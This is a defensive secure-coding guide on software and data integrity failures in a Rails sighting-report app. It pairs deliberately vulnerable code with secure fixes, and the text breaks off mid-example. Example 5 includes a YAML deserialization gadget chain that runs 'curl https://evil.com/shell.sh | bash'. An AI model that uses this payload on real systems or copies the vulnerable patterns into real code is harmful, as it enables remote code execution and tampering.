# A09 — Software and Data Integrity Failures

## Overview

Software and Data Integrity Failures occur when an application makes assumptions about the integrity of software updates, critical data, or CI/CD pipeline artifacts without verifying that they have not been tampered with. Originally OWASP 2021 A08, this category continues as 2025 A08 and encompasses a broad range of attacks: trusting unsigned code or data, insecure deserialization, CI/CD pipeline manipulation, and missing integrity verification on external inputs.

For APRS, data integrity is foundational. The platform collects UAP sighting reports from observers across the country, enriches them with weather and aviation deconfliction data from external APIs, and stores evidence files (photos, video, documents) for investigation. Each of these data flows represents an integrity boundary: sighting data submitted by users must be validated and audited; deconfliction results from external APIs must not be blindly trusted; Stripe webhook payloads must be verified against the Stripe API; and evidence files must have their content types validated against actual file contents, not just HTTP headers.

The CI/CD pipeline is another critical integrity boundary. If an attacker can inject code into the build pipeline, modify deployment artifacts, or manipulate database migrations, they can compromise the entire platform. Similarly, mass assignment vulnerabilities (where an attacker can set protected attributes like `role` or `verified` through unguarded Strong Parameters) represent a data integrity failure at the application layer. APRS must enforce integrity verification at every boundary: webhook signatures, file magic bytes, audit trails for sighting modifications, signed commits in the CI/CD pipeline, and strict Strong Parameters on every controller.

## APRS-Specific Attack Surface

- **Stripe webhook payload trust:** Using webhook payload data directly for authorization decisions (e.g., setting subscription tier or user role) instead of re-fetching from the Stripe API
- **Stripe webhook signature verification:** Missing or incorrect `Stripe-Signature` header validation, allowing forged webhook events
- **Stripe webhook replay attacks:** Reprocessing old webhook events due to missing idempotency checks
- **CI/CD pipeline integrity:** Unsigned commits merged to main; missing branch protection; PR-triggered workflows with write permissions; deployment triggered without CI checks passing
- **Active Storage content-type spoofing:** Trusting the `Content-Type` header from the upload request instead of validating actual file content via magic bytes
- **Sighting data integrity:** No audit trail for modifications to sighting records; no tamper detection for investigation notes; missing checksums on evidence files
- **Deconfliction result integrity:** Blindly trusting responses from external aviation/weather APIs without validation or sanitization
- **Mass assignment via Strong Parameters bypass:** Using `permit!` or overly permissive parameter lists that allow setting `role`, `verified`, `admin` attributes
- **Deserialization of untrusted data:** Using `Marshal.load`, `YAML.unsafe_load`, or `JSON.parse` with custom object creation on untrusted input
- **Database migration integrity:** Migrations run without review that could drop security constraints, remove audit columns, or alter authorization rules
- **Evidence file integrity:** No checksums stored for uploaded evidence files; files could be modified in storage without detection

## Examples

### Basic Level

#### Example 1: Trusting Stripe Webhook Payload for Authorization
**Source:** https://docs.stripe.com/webhooks/best-practices#verify-events-are-sent-from-stripe
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# app/jobs/stripe_webhook_processor_job.rb
# DANGEROUS: trusting the webhook payload data directly for authorization
# An attacker who can forge a webhook (or if signature check is missing)
# can set any user's subscription to any tier
class StripeWebhookProcessorJob < ApplicationJob
  queue_as :default

  def perform(payload)
    event = JSON.parse(payload, symbolize_names: true)
    subscription = event.dig(:data, :object)

    user = User.find_by(stripe_customer_id: subscription[:customer])
    return unless user

    # VULNERABLE: directly trusting webhook payload for tier assignment
    case subscription[:items][:data].first[:price][:id]
    when "price_basic"
      user.membership.update!(tier: "basic")
    when "price_professional"
      user.membership.update!(tier: "professional")
    when "price_enterprise"
      # Attacker forges webhook to grant enterprise tier for free!
      user.membership.update!(tier: "enterprise")
    end
  end
end
```

**Secure Fix:**
```ruby
# app/jobs/stripe_webhook_processor_job.rb
# ALWAYS re-fetch from Stripe API — never trust webhook payload for
# authorization decisions
class StripeWebhookProcessorJob < ApplicationJob
  queue_as :default
  retry_on Stripe::APIConnectionError, wait: :polynomially_longer, attempts: 5

  # @param stripe_event_id [String] the verified Stripe event ID
  # @param event_type [String] the Stripe event type
  # @return [void]
  def perform(stripe_event_id, event_type)
    # Step 1: Re-fetch the event from Stripe API
    event = Stripe::Event.retrieve(stripe_event_id)

    # Step 2: Verify event type matches what we expect
    unless event.type == event_type
      Rails.logger.warn(
        "Stripe event type mismatch",
        expected: event_type,
        actual: event.type,
        stripe_event_id: stripe_event_id
      )
      return
    end

    # Step 3: Re-fetch the subscription from Stripe API
    subscription = Stripe::Subscription.retrieve(
      event.data.object.id,
      expand: ["items.data.price"]
    )

    user = User.find_by(stripe_customer_id: subscription.customer)
    return unless user

    # Step 4: Use pessimistic locking to prevent race conditions
    user.with_lock do
      membership = user.membership || user.build_membership
      membership.update!(
        stripe_subscription_id: subscription.id,
        tier: resolve_tier_from_price(subscription),
        status: subscription.status,
        current_period_end: Time.at(subscription.current_period_end).utc
      )

      Rails.logger.info(
        "Membership updated from Stripe webhook",
        user_id: user.id,
        tier: membership.tier,
        stripe_event_id: stripe_event_id
      )
    end
  end

  private

  # @param subscription [Stripe::Subscription] verified subscription
  # @return [String] the resolved tier name
  def resolve_tier_from_price(subscription)
    price_id = subscription.items.data.first.price.id

    # Map price IDs from Rails credentials — never hardcode
    tier_map = {
      Rails.application.credentials.dig(:stripe, :basic_price_id) => "basic",
      Rails.application.credentials.dig(:stripe, :pro_price_id) => "professional",
      Rails.application.credentials.dig(:stripe, :enterprise_price_id) => "enterprise"
    }

    tier_map.fetch(price_id) do
      Rails.logger.error("Unknown Stripe price ID", price_id: price_id)
      "basic"  # Safe default
    end
  end
end
```

#### Example 2: Missing Webhook Signature Verification
**Source:** https://docs.stripe.com/webhooks/signatures
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# app/controllers/webhooks/stripe_controller.rb
# Webhook endpoint without signature verification — anyone can send
# fake events to this endpoint
class Webhooks::StripeController < ApplicationController
  skip_before_action :verify_authenticity_token
  skip_after_action :verify_authorized  # No justification documented!

  def create
    payload = JSON.parse(request.body.read)

    # No signature verification! Any HTTP client can hit this endpoint
    # and forge events to manipulate user subscriptions
    StripeWebhookProcessorJob.perform_later(
      payload["id"],
      payload["type"]
    )

    head :ok
  end
end
```

**Secure Fix:**
```ruby
# app/controllers/webhooks/stripe_controller.rb
# Proper webhook signature verification with idempotency
class Webhooks::StripeController < ApplicationController
  skip_before_action :verify_authenticity_token  # Webhooks use signature auth
  # Justification for skip_authorization: Stripe webhook authentication
  # is handled via Stripe-Signature header verification, not Pundit.
  skip_after_action :verify_authorized

  # @return [void]
  def create
    payload = request.body.read
    sig_header = request.headers["Stripe-Signature"]

    # Retrieve webhook secret from encrypted credentials
    endpoint_secret = Rails.application.credentials.dig(:stripe, :webhook_secret)

    # Verify signature — this uses HMAC-SHA256 to prove Stripe sent it
    event = begin
      Stripe::Webhook.construct_event(
        payload,
        sig_header,
        endpoint_secret,
        # Reject events older than 5 minutes (replay protection)
        tolerance: 300
      )
    rescue JSON::ParserError => e
      Rails.logger.warn("Stripe webhook: malformed payload", error: e.message)
      head :bad_request and return
    rescue Stripe::SignatureVerificationError => e
      Rails.logger.warn(
        "Stripe webhook: invalid signature",
        error: e.message,
        ip: request.remote_ip,
        event: "stripe_signature_failure"
      )
      head :bad_request and return
    end

    # Idempotency: reject duplicate events
    if StripeWebhookEvent.exists?(stripe_event_id: event.id)
      head :ok and return
    end

    # Record event before processing
    StripeWebhookEvent.create!(
      stripe_event_id: event.id,
      event_type: event.type,
      processed_at: Time.current
    )

    # Process asynchronously with re-fetch from API
    StripeWebhookProcessorJob.perform_later(event.id, event.type)

    head :ok
  end
end
```

#### Example 3: Mass Assignment via permit!
**Source:** https://guides.rubyonrails.org/action_controller_overview.html#strong-parameters
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# app/controllers/sightings_controller.rb
# Using permit! allows ALL parameters — attacker can set any attribute
class SightingsController < ApplicationController
  def create
    authorize Sighting
    @sighting = current_user.sightings.new(params[:sighting].permit!)
    # Attacker sends: { sighting: { verified: true, investigation_priority: "critical",
    #   user_id: admin_user_id, created_at: "2020-01-01" } }
    # All of these attributes get set!

    if @sighting.save
      redirect_to @sighting, notice: "Sighting submitted."
    else
      render :new, status: :unprocessable_entity
    end
  end

  def update
    @sighting = Sighting.find(params[:id])
    authorize @sighting
    # permit! on update is even worse — attacker can modify ownership,
    # verification status, or any other protected attribute
    @sighting.update(params[:sighting].permit!)
    redirect_to @sighting
  end
end
```

**Secure Fix:**
```ruby
# app/controllers/sightings_controller.rb
# Explicit permit list with role-based attribute access
class SightingsController < ApplicationController
  before_action :set_sighting, only: %i[show edit update destroy]
  after_action :verify_authorized

  # @return [void]
  def create
    authorize Sighting
    @sighting = current_user.sightings.build(sighting_params)

    if @sighting.save
      AuditLog.record!(
        action: "sighting.created",
        user: current_user,
        resource: @sighting,
        metadata: { ip: request.remote_ip }
      )
      redirect_to @sighting, notice: "Sighting submitted."
    else
      render :new, status: :unprocessable_entity
    end
  end

  # @return [void]
  def update
    authorize @sighting
    if @sighting.update(sighting_params)
      AuditLog.record!(
        action: "sighting.updated",
        user: current_user,
        resource: @sighting,
        metadata: { changes: @sighting.saved_changes.except("updated_at"), ip: request.remote_ip }
      )
      redirect_to @sighting, notice: "Sighting updated."
    else
      render :edit, status: :unprocessable_entity
    end
  end

  private

  # @return [Sighting] the sighting record
  def set_sighting
    @sighting = Sighting.find(params[:id])
  end

  # @return [ActionController::Parameters] permitted parameters
  def sighting_params
    # Base attributes any authenticated user can set
    permitted = %i[
      title description observed_at observed_timezone
      latitude longitude altitude_estimate
      duration_seconds number_of_objects
      shape_id weather_condition_id
    ]

    # Investigators can set additional fields
    if current_user.investigator? || current_user.admin?
      permitted += %i[investigation_notes credibility_score]
    end

    # Only admins can set verification status
    if current_user.admin?
      permitted += %i[verified investigation_priority]
    end

    # Never permit: user_id, created_at, updated_at, id
    params.require(:sighting).permit(permitted)
  end
end
```

### Intermediate Level

#### Example 4: Active Storage Content-Type Spoofing
**Source:** https://guides.rubyonrails.org/active_storage_overview.html#validating-attachments
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# app/models/evidence.rb
# Only checking the Content-Type header, which the client controls
# An attacker can upload a malicious .html or .svg file with an
# image/jpeg Content-Type header
class Evidence < ApplicationRecord
  belongs_to :sighting
  belongs_to :uploaded_by, class_name: "User"

  has_one_attached :file

  # VULNERABLE: only validates the declared content type
  validates :file, content_type: %w[image/jpeg image/png image/webp video/mp4 application/pdf]
  # An attacker uploads evil.html renamed to evidence.jpg with
  # Content-Type: image/jpeg — the validation passes!
end
```

**Secure Fix:**
```ruby
# app/models/evidence.rb
# Validate both declared content type AND actual file magic bytes
class Evidence < ApplicationRecord
  belongs_to :sighting
  belongs_to :uploaded_by, class_name: "User"

  has_one_attached :file

  # Content type allowlist
  ALLOWED_CONTENT_TYPES = %w[
    image/jpeg image/png image/webp
    video/mp4
    application/pdf
  ].freeze

  # Magic byte signatures for allowed file types
  MAGIC_BYTES = {
    "image/jpeg" => ["\xFF\xD8\xFF".b],
    "image/png" => ["\x89PNG\r\n\x1A\n".b],
    "image/webp" => ["RIFF".b],  # Followed by size, then "WEBP"
    "video/mp4" => ["\x00\x00\x00".b],  # ftyp box
    "application/pdf" => ["%PDF".b]
  }.freeze

  MAX_FILE_SIZE = 100.megabytes

  validates :file, presence: true
  validate :validate_file_content_type
  validate :validate_file_magic_bytes
  validate :validate_file_size

  private

  # @return [void]
  def validate_file_content_type
    return unless file.attached?

    unless ALLOWED_CONTENT_TYPES.include?(file.content_type)
      errors.add(:file, "must be a JPEG, PNG, WebP, MP4, or PDF (declared: #{file.content_type})")
    end
  end

  # @return [void]
  def validate_file_magic_bytes
    return unless file.attached?

    blob = file.blob
    # Read the first 16 bytes to check magic bytes
    header = blob.download_chunk(0...16)

    declared_type = file.content_type
    expected_signatures = MAGIC_BYTES[declared_type]

    unless expected_signatures&.any? { |sig| header.start_with?(sig) }
      errors.add(:file, "content does not match declared type (possible spoofing detected)")
      Rails.logger.warn(
        "File magic byte mismatch detected",
        declared_type: declared_type,
        header_hex: header.unpack1("H*")[0..31],
        sighting_id: sighting_id,
        event: "file_spoofing_attempt"
      )
    end
  end

  # @return [void]
  def validate_file_size
    return unless file.attached?

    if file.blob.byte_size > MAX_FILE_SIZE
      errors.add(:file, "must be less than #{MAX_FILE_SIZE / 1.megabyte}MB")
    end
  end
end

# app/controllers/evidences_controller.rb — serve files through authorization
class EvidencesController < ApplicationController
  before_action :set_evidence
  after_action :verify_authorized

  # @return [void]
  def show
    authorize @evidence

    # Serve with forced content disposition to prevent browser execution
    redirect_to rails_blob_path(
      @evidence.file,
      disposition: "attachment",
      content_type: @evidence.file.content_type
    )
  end

  private

  def set_evidence
    @evidence = Evidence.find(params[:id])
  end
end
```

#### Example 5: Deserialization of Untrusted Data
**Source:** https://ruby-doc.org/stdlib-3.4.0/libdoc/yaml/rdoc/YAML.html#module-YAML-label-Security
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# app/services/sighting_import_service.rb
# Importing sighting data from a YAML file — uses unsafe_load
# which can instantiate arbitrary Ruby objects
class SightingImportService
  # @param yaml_content [String] YAML content from user upload
  # @return [Array<Sighting>] imported sightings
  def self.import(yaml_content)
    # VULNERABLE: YAML.unsafe_load can execute arbitrary code
    # An attacker submits YAML containing:
    # --- !ruby/object:Gem::Installer
    # i: x
    # --- !ruby/object:Gem::SpecFetcher
    # i: y
    # --- !ruby/object:Gem::Requirement
    # requirements:
    #   !ruby/object:Gem::DependencyList
    #   specs:
    #   - !ruby/object:Gem::Source
    #     uri: "| curl https://evil.com/shell.sh | bash"
    data = YAML.unsafe_load(yaml_content)
    data.map { |attrs| Sighting.create!(attrs) }
  end
end

# Similarly dangerous with Marshal
class CacheService
  def self.restore(cached_data)
    # VULNERABLE: Marshal.load on untrusted data = RCE
    Marshal.load(Base64.decode64(cached_data))
  end
end
```

**Secure Fix:**
```ruby
# app/services/sighting_import_service.rb
# Use safe deserialization methods that only allow primitive types
class SightingImportService
  # Allowed YAML types — only primitives, no Ruby objects
  PERMITTED_YAML_CLASSES = [Date, Time, DateTime, Symbol].freeze

  # Allowed attributes for sighting import
  IMPORTABLE_ATTRIBUTES = %w[
    title description observed_at observed_timezone
    latitude longitude altitude_estimate
    duration_seconds number_of_objects
  ].freeze

  # @param yaml_content [String] YAML content from user upload
  # @param user [User] the importing user
  # @return [Array<Sighting>] imported sightings
  # @raise [ArgumentError] if YAML content is invalid
  def self.import(yaml_content, user:)
    # safe_load only allows basic types: String, Integer, Float,
    # NilClass, TrueClass, FalseClass, Date, Time, DateTime
    data = YAML.safe_load(
      yaml_content,
      permitted_classes: PERMITTED_YAML_CLASSES,
      permitted_symbols: [],
      aliases: false  # Prevent YAML alias/anchor attacks (billion laughs)
    )

    raise ArgumentError, "Expected array of sighting data" unless data.is_a?(Array)
    raise ArgumentError, "Maximum 100 sightings per import" if data.length > 100

    sightings = []
    ActiveRecord::Base.transaction do
      data.each do |attrs|
        raise ArgumentError, "Each entry must be a hash" unless attrs.is_a?(Hash)

        # Only allow known-safe attributes — reject any unexpected keys
        safe_attrs = attrs.slice(*IMPORTABLE_ATTRIBUTES)
        rejected_keys = attrs.keys - IMPORTABLE_ATTRIBUTES
        if rejected_keys.any?
          Rails.logger.warn(
            "Sighting import: rejected attributes",
            rejected: rejected_keys,
            user_id: user.id,
            event: "import_attribute_rejection"
          )
        end

        sighting = user.sightings.build(safe_attrs)
        sighting.save!
        sightings << sighting

        AuditLog.record!(
          action: "sighting.imported",
          user: user,
          resource: sighting,
          metadata: { source: "yaml_import" }
        )
      end
    end

    sightings
  end
end

# For caching, use JSON or MessagePack — never Marshal on untrusted data
class CacheService
  # @param data [Hash, Array] serializable data
  # @return [String] JSON-encoded cache value
  def self.store(data)
    JSON.generate(data)
  end

  # @param cached_json [String] JSON string from cache
  # @return [Hash, Array] parsed data
  def self.restore(cached_json)
    JSON.parse(cached_json)
    # JSON.parse only returns primitives — no object instantiation
  end
end
```

#### Example 6: Missing Audit Trail for Sighting Modifications
**Source:** https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# app/controllers/sightings_controller.rb
# No audit trail — modifications are invisible
class SightingsController < ApplicationController
  def update
    @sighting = Sighting.find(params[:id])
    authorize @sighting

    # Sighting is updated with no record of who changed what or when
    # An investigator could tamper with sighting data and leave no trace
    @sighting.update!(sighting_params)
    redirect_to @sighting, notice: "Sighting updated."
  end

  def destroy
    @sighting = Sighting.find(params[:id])
    authorize @sighting

    # Sighting is permanently destroyed — no soft delete, no audit log
    # Evidence of the sighting is lost forever
    @sighting.destroy!
    redirect_to sightings_path, notice: "Sighting deleted."
  end
end
```

**Secure Fix:**
```ruby
# app/models/audit_log.rb
# Immutable audit log for all sensitive data modifications
class AuditLog < ApplicationRecord
  belongs_to :user
  belongs_to :resource, polymorphic: true, optional: true

  validates :action, presence: true
  validates :user_id, presence: true

  # Audit logs are append-only — prevent updates and deletes
  before_update { raise ActiveRecord::ReadOnlyRecord, "Audit logs are immutable" }
  before_destroy { raise ActiveRecord::ReadOnlyRecord, "Audit logs cannot be deleted" }

  # @param action [String] the action performed
  # @param user [User] the user who performed the action
  # @param resource [ApplicationRecord, nil] the affected resource
  # @param metadata [Hash] additional context
  # @return [AuditLog] the created audit log entry
  def self.record!(action:, user:, resource: nil, metadata: {})
    create!(
      action: action,
      user: user,
      resource: resource,
      metadata: metadata.merge(
        timestamp: Time.current.iso8601(6),
        ip_address: metadata.delete(:ip)
      ).compact
    )
  end
end

# app/models/concerns/auditable.rb
# Concern for automatic audit logging on model changes
module Auditable
  extend ActiveSupport::Concern

  included do
    # Use soft delete instead of hard delete for data integrity
    scope :active, -> { where(deleted_at: nil) }
    scope :deleted, -> { where.not(deleted_at: nil) }

    # Track all changes for audit purposes
    has_many :audit_logs, as: :resource, dependent: :restrict_with_error
  end

  # @return [void]
  def soft_delete!(user:, reason: nil)
    transaction do
      update!(deleted_at: Time.current, deleted_by_id: user.id)

      AuditLog.record!(
        action: "#{self.class.name.underscore}.soft_deleted",
        user: user,
        resource: self,
        metadata: { reason: reason }
      )
    end
  end
end

# app/models/sighting.rb
class Sighting < ApplicationRecord
  include Auditable

  belongs_to :user
  has_many :evidences, dependent: :restrict_with_error
  has_many :investigations, dependent: :restrict_with_error

  # Store a SHA256 digest of critical fields to detect tampering
  before_save :compute_integrity_hash, if: :critical_fields_changed?

  private

  # @return [void]
  def compute_integrity_hash
    canonical = [
      title, description, observed_at&.iso8601,
      latitude, longitude, user_id
    ].map(&:to_s).join("|")

    self.integrity_hash = Digest::SHA256.hexdigest(canonical)
  end

  # @return [Boolean] true if any critical field was modified
  def critical_fields_changed?
    (changed & %w[title description observed_at latitude longitude user_id]).any?
  end
end

# app/controllers/sightings_controller.rb — with audit trail
class SightingsController < ApplicationController
  before_action :set_sighting, only: %i[show edit update destroy]
  after_action :verify_authorized

  # @return [void]
  def update
    authorize @sighting

    old_attributes = @sighting.attributes.slice(
      "title", "description", "observed_at", "latitude", "longitude",
      "verified", "investigation_priority"
    )

    if @sighting.update(sighting_params)
      AuditLog.record!(
        action: "sighting.updated",
        user: current_user,
        resource: @sighting,
        metadata: {
          changes: @sighting.saved_changes.except("updated_at", "integrity_hash"),
          previous_values: old_attributes,
          ip: request.remote_ip
        }
      )
      redirect_to @sighting, notice: "Sighting updated."
    else
      render :edit, status: :unprocessable_entity
    end
  end

  # @return [void]
  def destroy
    authorize @sighting

    # Soft delete with audit trail — never hard delete sighting data
    @sighting.soft_delete!(user: current_user, reason: params[:reason])
    redirect_to sightings_path, notice: "Sighting archived."
  end

  private

  def set_sighting
    @sighting = Sighting.active.find(params[:id])
  end
end
```

### Advanced Level

#### Example 7: CI Pipeline Injection via Unsigned Commits
**Source:** https://docs.github.com/en/authentication/managing-commit-signature-verification/about-commit-signature-verification
**Status:** [VERIFIED]

**Vulnerable Code:**
```yaml
# .github/workflows/deploy.yml — deploys on any push to main
# No requirement for signed commits or CI checks to pass first
# An attacker with write access can push directly to main
name: Deploy
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    # No environment protection rules!
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Deploy to production
        run: |
          # This runs on every push — including force pushes
          # and commits that haven't passed CI
          bundle exec rails deploy
        env:
          RAILS_MASTER_KEY: ${{ secrets.RAILS_MASTER_KEY }}
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
          STRIPE_SECRET_KEY: ${{ secrets.STRIPE_SECRET_KEY }}
```

**Secure Fix:**
```yaml
# .github/workflows/deploy.yml — deployment with integrity checks
name: Deploy
on:
  push:
    branches: [main]

jobs:
  # Gate 1: All CI checks must pass before deployment
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - uses: ruby/setup-ruby@d4526a55538b775af234ba4af27118ed6f8f6677
        with:
          ruby-version: "3.4.8"
          bundler-cache: false
      - run: bundle install --frozen --jobs 4
      - run: bundle exec rspec
      - run: bundle exec rubocop --parallel
      - run: bundle exec brakeman --no-pager
      - run: bundle exec bundler-audit check --update

  # Gate 2: Security scan must pass
  security-scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Verify commit signature
        run: |
          # Require GPG or SSH signature on the triggering commit
          SIGNATURE=$(git log -1 --format='%G?')
          if [[ "$SIGNATURE" != "G" && "$SIGNATURE" != "U" ]]; then
            echo "ERROR: Commit is not signed. Aborting deployment."
            exit 1
          fi
      - name: Scan container image
        run: trivy image --severity HIGH,CRITICAL --exit-code 1 $IMAGE_TAG

  # Gate 3: Deploy only after all checks pass
  deploy:
    needs: [test, security-scan]
    runs-on: ubuntu-latest
    # Environment protection rules require manual approval
    environment:
      name: production
      url: https://aprs.example.com
    permissions:
      contents: read
      deployments: write
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Deploy to production
        run: bundle exec rails deploy
        env:
          # Secrets only available in the protected environment
          RAILS_MASTER_KEY: ${{ secrets.RAILS_MASTER_KEY }}
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
```

```
# GitHub branch protection rules (configure via Settings > Branches)
# These MUST be set on the main branch:
#
# - Require a pull request before merging
#   - Required approving reviews: 1
#   - Dismiss stale pull request approvals when new commits are pushed
#   - Require review from Code Owners
# - Require status checks to pass before merging
#   - Require branches to be up to date before merging
#   - Status checks: test, security-scan
# - Require signed commits
# - Do not allow bypassing the above settings
# - Restrict who can push to matching branches
```

#### Example 8: Trusting External Deconfliction API Responses
**Source:** https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Consumer_Cheat_Sheet.html
**Status:** [UNVERIFIED]

**Vulnerable Code:**
```ruby
# app/services/deconfliction_service.rb
# Blindly trusts external API responses and stores them in the database
# without validation or sanitization
class DeconflictionService
  API_URL = "https://api.aviation-data.example.com/v1/flights"

  # @param sighting [Sighting] the sighting to deconflict
  # @return [DeconflictionResult] the stored result
  def self.check(sighting)
    response = Faraday.get(API_URL, {
      lat: sighting.latitude,
      lon: sighting.longitude,
      time: sighting.observed_at.iso8601,
      radius_nm: 50
    })

    data = JSON.parse(response.body)

    # VULNERABLE: storing unvalidated external data directly
    # If the API is compromised, it could inject:
    # - XSS payloads in aircraft_type or airline_name
    # - SQL injection in flight_number
    # - Arbitrarily large data in explanation field
    DeconflictionResult.create!(
      sighting: sighting,
      matched_flights: data["flights"],
      explanation: data["explanation"],
      raw_response: response.body,  # Storing raw untrusted data
      confidence_score: data["confidence"]
    )
  end
end
```

**Secure Fix:**
```ruby
# app/services/deconfliction_service.rb
# Validate, sanitize, and bound all external API responses
class DeconflictionService
  API_URL = "https://api.aviation-data.example.com/v1/flights"
  MAX_RESPONSE_SIZE = 1.megabyte
  MAX_FLIGHTS = 50
  REQUEST_TIMEOUT = 10  # seconds

  # Valid patterns for aviation data
  FLIGHT_NUMBER_PATTERN = /\A[A-Z]{2,3}\d{1,5}\z/
  AIRCRAFT_TYPE_PATTERN = /\A[A-Z0-9\- ]{1,50}\z/

  # @param sighting [Sighting] the sighting to deconflict
  # @return [DeconflictionResult] the validated result
  # @raise [DeconflictionError] if the API response is invalid
  def self.check(sighting)
    response = fetch_with_timeout(sighting)
    validate_response!(response)
    data = parse_and_validate!(response.body)

    DeconflictionResult.create!(
      sighting: sighting,
      matched_flights: sanitize_flights(data["flights"]),
      explanation: sanitize_text(data["explanation"], max_length: 2000),
      confidence_score: validate_confidence(data["confidence"]),
      api_response_hash: Digest::SHA256.hexdigest(response.body),
      checked_at: Time.current
    )
  rescue Faraday::TimeoutError, Faraday::ConnectionFailed => e
    Rails.logger.error("Deconfliction API unavailable", error: e.message, sighting_id: sighting.id)
    raise DeconflictionError, "External API unavailable"
  end

  class << self
    private

    # @param sighting [Sighting] the sighting to check
    # @return [Faraday::Response] the API response
    def fetch_with_timeout(sighting)
      connection = Faraday.new(url: API_URL) do |f|
        f.options.timeout = REQUEST_TIMEOUT
        f.options.open_timeout = 5
      end

      connection.get do |req|
        req.params = {
          lat: sighting.latitude.to_f.clamp(-90.0, 90.0),
          lon: sighting.longitude.to_f.clamp(-180.0, 180.0),
          time: sighting.observed_at.utc.iso8601,
          radius_nm: 50
        }
      end
    end

    # @param response [Faraday::Response] the raw response
    # @return [void]
    # @raise [DeconflictionError] if response is invalid
    def validate_response!(response)
      unless response.status == 200
        raise DeconflictionError, "API returned status #{response.status}"
      end

      if response.body.bytesize > MAX_RESPONSE_SIZE
        raise DeconflictionError, "Response exceeds maximum size"
      end
    end

    # @param body [String] the response body
    # @return [Hash] the parsed data
    def parse_and_validate!(body)
      data = JSON.parse(body)
      raise DeconflictionError, "Expected Hash response" unless data.is_a?(Hash)
      data
    rescue JSON::ParserError => e
      raise DeconflictionError, "Invalid JSON response: #{e.message}"
    end

    # @param flights [Object] the flights data from API
    # @return [Array<Hash>] sanitized flight data
    def sanitize_flights(flights)
      return [] unless flights.is_a?(Array)

      flights.first(MAX_FLIGHTS).filter_map do |flight|
        next unless flight.is_a?(Hash)

        {
          "flight_number" => sanitize_flight_number(flight["flight_number"]),
          "aircraft_type" => sanitize_aircraft_type(flight["aircraft_type"]),
          "altitude_ft" => flight["altitude_ft"].to_i.clamp(0, 100_000),
          "distance_nm" => flight["distance_nm"].to_f.clamp(0.0, 500.0)
        }.compact
      end
    end

    # @param text [String, nil] the text to sanitize
    # @param max_length [Integer] maximum allowed length
    # @return [String, nil] the sanitized text
    def sanitize_text(text, max_length:)
      return nil unless text.is_a?(String)

      ActionController::Base.helpers.sanitize(
        text.truncate(max_length),
        tags: [],      # Strip ALL HTML tags
        attributes: [] # Strip ALL HTML attributes
      )
    end

    # @param number [String, nil] the flight number
    # @return [String, nil] the validated flight number
    def sanitize_flight_number(number)
      return nil unless number.is_a?(String)
      return nil unless number.match?(FLIGHT_NUMBER_PATTERN)

      number
    end

    # @param type [String, nil] the aircraft type
    # @return [String, nil] the validated aircraft type
    def sanitize_aircraft_type(type)
      return nil unless type.is_a?(String)
      return nil unless type.match?(AIRCRAFT_TYPE_PATTERN)

      type
    end

    # @param score [Object] the confidence score
    # @return [Float] the validated confidence score
    def validate_confidence(score)
      score.to_f.clamp(0.0, 1.0)
    end
  end
end

# Custom error class
class DeconflictionError < StandardError; end
```

#### Example 9: Unsigned Gem Sources in Gemfile
**Source:** https://bundler.io/guides/rubygems_org.html
**Status:** [UNVERIFIED]

**Vulnerable Code:**
```ruby
# Gemfile — using git sources without verifying integrity
# An attacker who compromises the GitHub account or performs a MITM
# can serve malicious gem code
source "https://rubygems.org"

gem "rails", "~> 8.1.2"

# Git source without tag or commit pinning — always pulls latest main
gem "aprs-geocoder", git: "https://github.com/aprs-org/geocoder.git"

# GitHub shorthand — no version pinning, no integrity check
gem "aprs-weather-client", github: "aprs-org/weather-client"

# Gem from arbitrary URL — no checksum verification
gem "custom-spatial", source: "https://gems.example.com"
```

**Secure Fix:**
```ruby
# Gemfile — pin all dependencies with integrity verification
source "https://rubygems.org"

gem "rails", "~> 8.1.2"

# Pin git dependencies to specific tags AND verify the ref
gem "aprs-geocoder",
  git: "https://github.com/aprs-org/geocoder.git",
  tag: "v1.2.3",
  ref: "abc123def456"  # Full commit SHA for immutability

# For private gems, prefer git with tag over gem servers
gem "aprs-weather-client",
  git: "https://github.com/aprs-org/weather-client.git",
  tag: "v2.1.0",
  ref: "789def012abc"

# In CI, always use frozen install to verify Gemfile.lock integrity
# bundle config set --local frozen true
# bundle install --jobs 4

# Post-install verification script: config/verify_gems.rb
# Run after bundle install to verify gem checksums
```

```ruby
# config/verify_gems.rb
# Verify installed gem integrity against known checksums
# Run this as part of the CI pipeline after `bundle install`

require "digest"
require "yaml"

checksums_file = File.join(__dir__, "gem_checksums.yml")
unless File.exist?(checksums_file)
  warn "WARNING: gem_checksums.yml not found — skipping integrity verification"
  exit 0
end

expected = YAML.safe_load(File.read(checksums_file), permitted_classes: [Symbol])

Gem.loaded_specs.each do |name, spec|
  next unless expected.key?(name)

  gemspec_path = spec.loaded_from
  next unless gemspec_path && File.exist?(gemspec_path)

  actual_checksum = Digest::SHA256.hexdigest(File.read(gemspec_path))
  expected_checksum = expected[name]["gemspec_sha256"]

  if actual_checksum != expected_checksum
    abort "INTEGRITY FAILURE: #{name} gemspec checksum mismatch " \
          "(expected: #{expected_checksum}, actual: #{actual_checksum})"
  end
end

puts "All gem checksums verified successfully."
```

#### Example 10: Stripe Webhook Replay Attack
**Source:** https://docs.stripe.com/webhooks/best-practices#handle-duplicate-events
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# app/controllers/webhooks/stripe_controller.rb
# Signature is verified but events can be replayed — no idempotency
class Webhooks::StripeController < ApplicationController
  skip_before_action :verify_authenticity_token
  skip_after_action :verify_authorized

  def create
    payload = request.body.read
    sig_header = request.headers["Stripe-Signature"]
